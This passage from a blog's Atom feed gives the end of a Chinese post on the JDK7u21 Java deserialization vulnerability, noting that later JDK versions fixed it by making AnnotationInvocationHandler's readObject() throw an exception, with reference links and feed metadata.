src="../images/JDK7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/AnnotationInvocationHandler-fix.png" alt="image"></p><p>在 jdk &gt; 7u21 的版本，修复了这个漏洞，看了下 7u79 的代码，<code>AnnotationInvocationHandler</code> 的 <code>readObject()</code> 方法增加了异常抛出，导致反序列化失败。</p><p>参考：</p><p><a href="https://xz.aliyun.com/t/8050" target="_blank" rel="noopener">1</a></p><p><a href="https://b1ngz.github.io/java-deserialization-jdk7u21-gadget-note/" target="_blank" rel="noopener">2</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;序言&quot;&gt;&lt;a href=&quot;#序言&quot; class=&quot;headerlink&quot; title=&quot;序言&quot;&gt;&lt;/a&gt;序言&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;往事依稀浑似梦，都随风雨到心头。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;终于开学了，疯狂更博启动。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Java" scheme="https://0range228.github.io/categories/Java/"/>
    
    
      <category term="漏洞分析" scheme="https://0range228.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
</feed>
